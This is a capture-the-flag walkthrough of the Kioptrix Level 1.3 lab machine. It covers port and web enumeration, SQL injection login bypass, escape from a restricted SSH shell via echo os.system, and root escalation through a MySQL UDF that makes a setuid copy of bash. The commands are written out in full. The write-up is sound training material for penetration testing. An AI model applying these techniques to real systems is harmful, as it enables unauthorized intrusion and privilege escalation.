# Machine Link
https://www.vulnhub.com/entry/kioptrix-level-13-4,25/

## Machine Details

#### **OS**
Linux

#### **Web-Technology**
PHP/5.2.4

#### **IP**
192.168.56.102

#### **Users:**
john
robert
leonferret


----

# Nmap Results

```bash
nmap -v -sT -sV -sC -A -O -p- 192.168.56.102

PORT    STATE SERVICE     VERSION
**22**/tcp  open  **ssh**         **OpenSSH 4.7p1** Debian 8ubuntu1.2 (protocol 2.0)

**80**/tcp  open  http        **Apache httpd 2.2.8** ((Ubuntu) **PHP/5.2.4**-2ubuntu5.6 with **Suhosin-Patch**)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

**139**/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
**445**/tcp open  netbios-ssn **Samba smbd 3.0.28a** (workgroup: WORKGROUP)
MAC Address: 08:00:27:B5:EA:0C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: **Linux 2.6.X**
OS details: **Linux 2.6.9 - 2.6.33**


**Host script results:**
| smb-os-discovery: 
|   OS: Unix (**Samba 3.0.28a**)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: **Kioptrix4.localdomain**
|_  System time: 2024-12-27T10:37:48-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

---

# Web Service Enumeration

### NIKTO

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:           192.168.56.102
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
- PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /database.sql: Server may leak inodes via ETags, header found with file /database.sql, inode: 148370, size: 298, mtime: Sat Feb  4 21:41:51 2012. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /database.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /database.sql: Database SQL found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

---
### WFUZZ

#### FILES: / (Web Root)
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://192.168.56.102/FUZZ

000000034:   302        1 L      22 W       220 Ch      "member.php"
000000157:   403        10 L     33 W       330 Ch      ".htaccess"
000000001:   200        45 L     94 W       1255 Ch     "index.php"
000000156:   302        0 L      0 W        0 Ch        "logout.php"
000002037:   200        0 L      9 W        109 Ch      "checklogin.php"
000008013:   302        0 L      0 W        0 Ch        "login_success.php"
000009703:   200        12 L     43 W       298 Ch      "database.sql"                                                                             
```

#### DIRECTORIES: / (Web Root)
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://192.168.56.102/FUZZ

000000036:   302        0 L      0 W        0 Ch        "logout"                              000000002:   301        9 L      31 W       356 Ch      "images"
000000159:   302        1 L      22 W       220 Ch      "member"
000000245:   200        45 L     94 W       1255 Ch     "index"
000003672:   301        9 L      31 W       354 Ch      "john"
000012440:   301        9 L      31 W       356 Ch      "robert"
000038649:   200        0 L      9 W        109 Ch      "checklogin"
000048570:   200        45 L     94 W       1255 Ch     "index"                                                                                    
```


---
## database.sql file 

From nikto and wfuzz we found the  **database.sql**, here we found this text :
<img width="1264" height="689" alt="image" src="https://github.com/user-attachments/assets/18e18338-a745-4645-90d0-87e272fe8c50" />

We found a username **john** with password 1234 and id 1.

---
# SQL Injection

First lets check SQLi with using **'** as username and password :

<img width="1264" height="689" alt="image" src="https://github.com/user-attachments/assets/b016f2a4-cbce-4078-a090-01149543fd81" />
We got this error indicating possible SQLi.


Now as we have the usernames of users john & robert we can try to do SQL injection with these usernames on the web application running on port 80

<img width="1918" height="1053" alt="image" src="https://github.com/user-attachments/assets/8f92a8b6-94ee-4a38-8f89-0b9f4902341b" />


Give a random test string as password and take this request in burp intruder. Select the password string as payload poisition. I have used the **SQL-Injection-Auth-Bypass-Payloads.txt** from :
https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt

After this start the attack (remember to use URL encode these characters)

Now sort these responses by using **Grep match** functionality and add Wrong string to match in response.
<img width="1681" height="977" alt="image" src="https://github.com/user-attachments/assets/8d3ec2f7-22e9-4722-af83-23bba949f898" />


Here we found several sql injection payloads through which we logged in successfully. Here we got the passwords of both robert and john users.

<img width="1627" height="782" alt="image" src="https://github.com/user-attachments/assets/9a417291-91b0-4444-84c1-271a9384cd08" />


---
# SSH

Now as we have the credentials we can try to login thorugh ssh with these.

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa robert@192.168.56.102

ADGAdsafdfwt4gadfga==
```

We got the SHELL :
<img width="975" height="360" alt="image" src="https://github.com/user-attachments/assets/6ff4ca6e-86ca-4d9a-9461-056892c6fd8b" />

But this is not the real shell, it is a custom restricted shell which allows only these commands :

`cd clear echo exit help ll lpath ls`

Now we need to get the real shell for privilege escalation.

Let's use the echo commands built in functionality os.system which can run commands :
```bash
echo os.system("/bin/bash")  
```

We got the **SHELL!**
<img width="961" height="419" alt="image" src="https://github.com/user-attachments/assets/7681e4d7-8829-4f32-9efb-06b26ad97141" />


---
# Privilege Escalation

First let's check the commands john can use with the sudo power.
<img width="774" height="91" alt="image" src="https://github.com/user-attachments/assets/8edfe8ff-fca2-42fb-b032-10af54b298ba" />

John does not have any commands which can be run as root.

Lets use mysql function to gain root privileges :

```bash
mysql -u root -p

<empty-password>
```


```mysql
mysql> use members;

#creating function sys_eval using lib_msqludf_sys.so library.
mysql> CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';

#using the function to capy bash and giving it the sticky bit permission
mysql> select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash")
```


Getting root shell :
```bash
#now run ./bash file as root by:

cd /var/tmp/

./bash -p

whoami
root

#now after root acces go to /root and cat the congrats.txt file
```


<img width="1775" height="925" alt="image" src="https://github.com/user-attachments/assets/851a6d0a-54f2-4ae2-a5f5-40670cda2733" />


---

# Take Away Concepts

- If you have mysql access as root than always search for plugins and libraries through which you can save or execute files as root.
- Use pspy binary to see the processes running as root like cronjobs, etc.


---
